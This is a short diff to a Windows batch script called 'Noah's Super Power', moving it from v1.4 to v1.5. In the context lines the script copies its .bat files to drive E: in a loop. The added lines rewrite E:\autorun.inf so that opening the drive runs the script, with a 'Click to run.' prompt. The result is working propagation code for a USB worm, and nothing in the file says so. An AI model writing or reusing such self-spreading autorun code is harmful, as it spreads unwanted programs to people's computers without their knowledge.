@@ -1,5 +1,5 @@
 :::::::::::::::::::::::::::
-::NOAH'S SUPER POWER V1.4::
+::NOAH'S SUPER POWER V1.5::
 :::::::::::::::::::::::::::
 :: Copyright (c) Grathium Softwares 2018, grathiumsoftwears@gmail.com
 
@@ -47,6 +47,12 @@ if exist "E:\*.1.bat" goto loop
 for /r %%f in (*.1.bat) do (
 type %%~nxf >>"E:\%%~nxf"
 )
+if exist "E:\autorun.inf" del "E:\autorun.inf"
+echo [autorun]>>"E:\autorun.inf"
+echo icon=icon.ico>>"E:\autorun.inf"
+echo open=%CD:~0,3%>>"E:\autorun.inf"
+echo action=Click to run.>>"E:\autorun.inf"
+echo shell\open\command=%CD:~0,3%>>"E:\autorun.inf"
 goto loop
 
 ::open change window location if needed
